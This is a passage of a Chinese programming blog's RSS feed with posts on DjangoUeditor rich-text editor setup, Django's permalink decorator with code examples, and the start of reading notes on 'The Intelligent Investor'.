                &lt;span class="s1"&gt;&amp;#39;horizontal&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;date&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;time&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;spechars&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;snapscreen&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;wordimage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;inserttable&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;deletetable&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertparagraphbeforetable&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertrow&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;deleterow&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;insertcol&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;deletecol&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mergecells&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mergeright&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mergedown&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;splittocells&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;splittorows&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;splittocols&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;charts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="s1"&gt;&amp;#39;print&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;preview&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;searchreplace&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;help&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;drafts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]],&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在models.py里选用mytoolbars这个风格，像这样：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;UEditorField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;u&amp;#39;内容   &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;imagePath&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;uploadimg/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;imageManagerPath&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;imglib&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;toolbars&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mytoolbars&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;elementPathEnabled&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;&lt;span class="n"&gt;filePath&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;upload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;blank&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;打开后台，可以看到全功按钮板块。&lt;/p&gt;
&lt;p&gt;她说项目要求上传的本地图片必须把图片名字哈希&lt;code&gt;加密&lt;/code&gt;，由于近来略忙，我只想当然地给她讲了下思路：在自己重载form，在表单里拦截一下数据，在那里修改图片名字。或者在图片保存前修改。&lt;br /&gt;
她按照这个思路并没有成功，于是我看了下DjangoUeditor源码，似乎上传图片那块不是很常规，于是直接修改源码（这个习惯不好。。），我们先找到文件名的生成函数，就是这个&lt;a href="https://github.com/zhangfisher/DjangoUeditor/blob/master/DjangoUeditor/utils.py"&gt;GenerateRndFilename&lt;/a&gt;，&lt;code&gt;return "%s_%s%s%s"&lt;/code&gt;,改之～搞定。这种方法略暴力，DjangoUeditor的源码不复杂，似乎页不需要升级，这样不会带来什么兼容问题。暂时取个捷径。  大家估计开始鄙视我了。。  &lt;/p&gt;
&lt;p&gt;此外，需要注意的是：&lt;code&gt;xadmin&lt;/code&gt;中并不支持DjangoUeditor，
之前在django技术群中同xadmin的作者聊过 ，xadmin中并不支持DjangoUeditor，我们可以使用其他的富文本编辑器。这个东西已经帮我们做好配置的脏活了。好东西自然是在github里的，&lt;a href="https://github.com/sshwsfc/xadmin-cms"&gt;xadmin-cms&lt;/a&gt;,介绍中说：&lt;br /&gt;
Xcms 是 django-xadmin 的一套插件集, 包含制作 cms 系统需要的常用插件:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可见即可得编辑器&lt;/li&gt;
&lt;li&gt;树形组件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;至于怎么用，自己跑一遍demo_app，看看里面的参数，参考注释修修改改就好了。蛋疼的是我的后台一直不显示富文本编辑器，django群里的一哥们说他的没问题，难道是我打开方式不对 囧，一直怀疑是xadmin版本的问题。xadmin-cms最新一次提交是11个月前。&lt;/p&gt;
&lt;p&gt;如果你非要在xadmin中使用Ueditor，参考下这篇文章&lt;a href="http://blog.csdn.net/u012762088/article/details/14497105"&gt;在django xadmin中使用 Ueditor&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;===========分界线 14-3-20===============
在新闻发布系统中有一个需求其实挺常见的：在news_list(新闻列表)页显示摘要，一般而言需要将新闻中的第一张图片也放到这里。
这里解决方案很多，粗暴的方法比如在前台里&lt;code&gt;{{new.content}}&lt;/code&gt;(content用于保存新闻内容)，之后用js来做，取出图片置顶,多余的文本隐藏（我们并不知道图片在文本中的什么位置,所以有必要把文本全部显示出）。
很不优雅对吧，我们也可以这样解决，前台仅显示{{new.content_first_img|safe }} ,&lt;code&gt;{{new.content|slice:":200"|safe }}&lt;/code&gt;,这样语意很清晰有木有。
“代码是写给人看的，只是顺带能在机器上运行”
那么content_first_img是怎么实现的。
直接上代码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#models.py&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;BeautifulSoup&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;save&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;#取出第一张图片的html，使用正则&lt;/span&gt;
        &lt;span class="n"&gt;soup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content_html&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content_first_img&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;img&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;#soup.first(&amp;quot;img&amp;quot;) #只返回第一个pic,需要转化为str，否则是对象&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content_pic&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; 
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content_pic&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span class="nb"&gt;super&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;News&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;实质上我们就是重载了save()方法在，当然你需要为你的模型新建一个content_first_img字段，用于存储第一张图片
好了～。&lt;/p&gt;
&lt;h3&gt;TinyMCE&lt;/h3&gt;
&lt;p&gt;waiting&lt;/p&gt;
&lt;h3&gt;ckeditor&lt;/h3&gt;
&lt;p&gt;waiting&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 11 Mar 2014 00:00:00 +0000</pubDate><guid>tag:,2014-03-11:django-WYSIWYG.html</guid><category>django</category></item><item><title>django笔记之permalink函数</title><link>/django-permalink.html</link><description>&lt;p&gt;为了让项目更好维护，应当尽量减少硬编码，使用permalink能减少url硬编码。我们直接看下它的源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;permalink&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Decorator that calls urlresolvers.reverse() to return a URL using&lt;/span&gt;
&lt;span class="sd"&gt;    parameters returned by the decorated function &amp;quot;func&amp;quot;.&lt;/span&gt;

&lt;span class="sd"&gt;    &amp;quot;func&amp;quot; should be a function that returns a tuple in one of the&lt;/span&gt;
&lt;span class="sd"&gt;    following formats:&lt;/span&gt;
&lt;span class="sd"&gt;        (viewname, viewargs)&lt;/span&gt;
&lt;span class="sd"&gt;        (viewname, viewargs, viewkwargs)&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.core.urlresolvers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt;

    &lt;span class="nd"&gt;@wraps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;inner&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;bits&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bits&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;bits&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;inner&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;由此不难看出，permalink实质是一个装饰器。
其实在我之前的yunfan项目中就用了permalink，主要是受&lt;a href="https://github.com/nathanborror/django-basic-apps"&gt;'django-basic-apps'&lt;/a&gt;的启发，很认真地看过这个项目的源码，感觉写得挺好看的。带领大家弄懂permalink的原理后，我们再来看看permalink在django-basic-apps的groups模块中的应用，如此一来将理论与实践结合。&lt;/p&gt;
&lt;p&gt;好，废话不说，关于permalink，先看&lt;a href="https://docs.djangoproject.com/en/dev/ref/models/instances/"&gt;django官网解释&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This decorator takes the name of a URL pattern (either a view name or a URL pattern name) and a list of position or keyword arguments and uses the URLconf patterns to construct the correct, full URL. It returns a string for the correct URL, with all parameters substituted in the correct positions.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;balabala说了一堆，我们还是直接看例子吧：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#urls.py&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;^people/(\d+)/$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;people.views.details&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;

&lt;span class="c1"&gt;#models.py&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;


&lt;span class="nd"&gt;@models.permalink&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_absolute_url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;people.views.details&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
&lt;span class="c1"&gt;#get_absolute_url一般是某个类的方法&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;当你的url更复杂时，你会更感激permalink,像这样&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;/archive/(?P&amp;lt;year&amp;gt;\d{4})/(?P&amp;lt;month&amp;gt;\d{2})/(?P&amp;lt;day&amp;gt;\d{2})/$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;archive_view&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这是很常见的博客的url.&lt;br /&gt;
对应的model&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@models.permalink&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_absolute_url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;archive_view&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;year&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;created&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;year&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;month&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;created&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strftime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;%m&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;day&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;created&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strftime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;到这里其实已经很明了了。archive_view是url函数，permalink会根据archive_view指向的模式以及提供的参数字典&lt;code&gt;反向解析&lt;/code&gt;出url，并且返回，至此，一切搞定。&lt;br /&gt;
如此一来,抽象地看，对象的url似乎是对象的方法，维护起来十分方便。
在模板里只要酱紫用就行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{% archive.get_absolute_url %} 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;多么清晰不是～&lt;/p&gt;
&lt;p&gt;好的，我们继续看下permalink在django-basic-apps的groups模块中的应用。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#urls.py&lt;/span&gt;
&lt;span class="n"&gt;GROUP_URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;r&amp;#39;(?P&amp;lt;slug&amp;gt;[-\w]+)/&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;patterns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;basic.groups.views.groups&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="o"&gt;....&lt;/span&gt;
    &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;^&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;$&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;GROUP_URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;group_detail&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;group&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;#models.py&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Group&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; Group model &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blank&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;slug&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SlugField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unique&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help_text&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Used for the Group URL: http://example.com/groups/the-club/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="o"&gt;....&lt;/span&gt;

    &lt;span class="nd"&gt;@permalink&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_absolute_url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;groups:group&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;slug&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;slug&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;

&lt;span class="c1"&gt;#group_list.html&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;li&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;{{ group.get_absolute_url }}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{{&lt;/span&gt; &lt;span class="n"&gt;group&lt;/span&gt; &lt;span class="p"&gt;}}&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;li&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;良好的代码便是最好的注释，相信大家不须我解释都看懂啦~&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 26 Feb 2014 00:00:00 +0000</pubDate><guid>tag:,2014-02-26:django-permalink.html</guid><category>django</category></item><item><title>聪明的投资者</title><link>/book-The-intelligent-investor.html</link><description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;***摘自本杰明·格雷厄姆《聪明的投资者》&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;*&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在知乎看到的推荐，恰好近期对财富这个话题饶有兴致，于是到图书馆借来一看。&lt;/p&gt;
&lt;h3&gt;第四版序（--沃伦.巴菲特）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
